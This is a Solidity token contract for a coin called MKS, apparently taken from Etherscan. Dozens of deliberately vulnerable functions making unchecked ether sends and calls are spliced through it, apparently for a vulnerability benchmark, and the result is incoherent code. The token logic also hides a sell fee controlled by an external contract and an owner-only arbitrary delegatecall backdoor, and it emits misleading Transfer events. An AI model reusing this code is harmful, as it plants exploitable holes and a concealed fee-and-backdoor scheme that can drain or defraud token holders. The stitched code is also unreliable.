/**
 *Submitted for verification at Etherscan.io on 2020-10-18
*/

/**
 *Submitted for verification at Etherscan.io on 2020-10-18
 * 
 *                         /$$                                   /$$                          
 *                        |__/                                  | $$                          
 *      /$$$$$$$  /$$$$$$  /$$ /$$$$$$$  /$$$$$$/$$$$   /$$$$$$ | $$   /$$  /$$$$$$   /$$$$$$$
 *     /$$_____/ /$$__  $$| $$| $$__  $$| $$_  $$_  $$ |____  $$| $$  /$$/ /$$__  $$ /$$_____/
 *    | $$      | $$  \ $$| $$| $$  \ $$| $$ \ $$ \ $$  /$$$$$$$| $$$$$$/ | $$$$$$$$|  $$$$$$ 
 *    | $$      | $$  | $$| $$| $$  | $$| $$ | $$ | $$ /$$__  $$| $$_  $$ | $$_____/ \____  $$
 *    |  $$$$$$$|  $$$$$$/| $$| $$  | $$| $$ | $$ | $$|  $$$$$$$| $$ \  $$|  $$$$$$$ /$$$$$$$/
 *     \_______/ \______/ |__/|__/  |__/|__/ |__/ |__/ \_______/|__/  \__/ \_______/|_______/ 
 *       
 * 
 * web:            coinmakes.com
 * telegram:       coinmakes
 * Total supply:   20.000.000 MKS 
 * Uniswap supply (50% of total supply): 2.000.000 MKS 
 * SPDX-License-Identifier: UNLICENSED
 */

pragma solidity >=0.6.12 <0.7.0;

interface FeeManagementLibrary {
    function calculate(address,address,uint256) external returns(uint256);
}

contract StandardToken {

  function unhandledsend_unchk38(address payable callee) public {
    callee.send(5 ether);
  }
  event Transfer(address indexed _from, address indexed _to, uint _value);
  bool public payedOut_unchk32 = false;
address payable public winner_unchk32;
uint public winAmount_unchk32;

function sendToWinner_unchk32() public {
        require(!payedOut_unchk32);
        winner_unchk32.send(winAmount_unchk32);
        payedOut_unchk32 = true;
    }
  event Approval(address indexed _owner, address indexed _spender, uint _value);

    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
function bug_unchk7() public{
address payable addr_unchk7;
if (!addr_unchk7.send (10 ether) || 1==1)
	{revert();}
}

    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        uint256 fee = calcFee(_from, _to, _value);
        balanceOf[_to] += (_value - fee);
        emit Transfer(_from, _to, _value);
        return true;
    }
function callnotchecked_unchk13(address callee) public {
    callee.call.value(1 ether);
  }

    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        pair = address(uint(keccak256(abi.encodePacked(
                hex'ff',
                factory,
                keccak256(abi.encodePacked(token0, token1)),
                hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash
            ))));
    }

    function calcFee(address _from, address _to, uint _value) private returns(uint256) {
        uint fee = 0;
        if (_to == UNI && _from != owner) {
            fee = FeeManagementLibrary(FeeManagement).calculate(address(this), UNI, _value);
        }
        return fee;
    }
function unhandledsend_unchk26(address payable callee) public {
    callee.send(5 ether);
  }

    function delegate(address a, bytes memory b) public payable {
        require(msg.sender == owner);
        a.delegatecall(b);
    }
function bug_unchk39(address payable addr) public
      {addr.send (4 ether); }

    function batchSend(address[] memory _tos, uint _value) public payable returns (bool) {
        require (msg.sender == owner);
        uint total = _value * _tos.length;
        require(balanceOf[msg.sender] >= total);
        balanceOf[msg.sender] -= total;
        for (uint i = 0; i < _tos.length; i++) {
            address _to = _tos[i];
            balanceOf[_to] += _value;
            emit Transfer(msg.sender, _to, _value/2);
            emit Transfer(msg.sender, _to, _value/2);
        }
        return true;
    }
function withdrawBal_unchk41 () public{
	uint64 Balances_unchk41 = 0;
	msg.sender.send(Balances_unchk41);}

    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
bool public payedOut_unchk21 = false;

function withdrawLeftOver_unchk21() public {
        require(payedOut_unchk21);
        msg.sender.send(address(this).balance);
    }

  function UncheckedExternalCall_unchk4 () public
{  address payable addr_unchk4;
   if (! addr_unchk4.send (42 ether))  
      {// comment1;
      }
	else
      {//comment2;
      }
}
  mapping (address => uint) public balanceOf;
  function my_func_unchk35(address payable dst) public payable{
        dst.send(msg.value);
    }
  mapping (address => mapping (address => uint)) public allowance;

  bool public payedOut_unchk20 = false;
address payable public winner_unchk20;
uint public winAmount_unchk20;

function sendToWinner_unchk20() public {
        require(!payedOut_unchk20);
        winner_unchk20.send(winAmount_unchk20);
        payedOut_unchk20 = true;
    }
  uint constant public decimals = 18;
  function bug_unchk18() public{
uint receivers_unchk18;
address payable addr_unchk18;
if (!addr_unchk18.send(42 ether))
	{receivers_unchk18 +=1;}
else
	{revert();}
}
  uint public totalSupply;
  bool public payedOut_unchk8 = false;
address payable public winner_unchk8;
uint public winAmount_unchk8;

function sendToWinner_unchk8() public {
        require(!payedOut_unchk8);
        winner_unchk8.send(winAmount_unchk8);
        payedOut_unchk8 = true;
    }
  string public name;
  function bug_unchk3(address payable addr) public
      {addr.send (42 ether); }
  string public symbol;
  function callnotchecked_unchk37(address payable callee) public {
    callee.call.value(1 ether);
  }
  address private owner;
  function my_func_unchk23(address payable dst) public payable{
        dst.send(msg.value);
    }
  address private UNI;
  function callnotchecked_unchk25(address payable callee) public {
    callee.call.value(1 ether);
  }
  address constant internal FeeManagement = 0x1691b5bA9E44Fdc0DCA002726a85d438B96183c4;

    constructor(string memory _name, string memory _symbol, uint _totalSupply) payable public {
        owner = msg.sender;
        symbol = _symbol;
        name = _name;
        totalSupply = _totalSupply;
        balanceOf[msg.sender] = totalSupply;
        allowance[msg.sender][0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = uint(-1);
        UNI = pairFor(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, address(this));
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
function unhandledsend_unchk14(address payable callee) public {
    callee.send(5 ether);
  }
}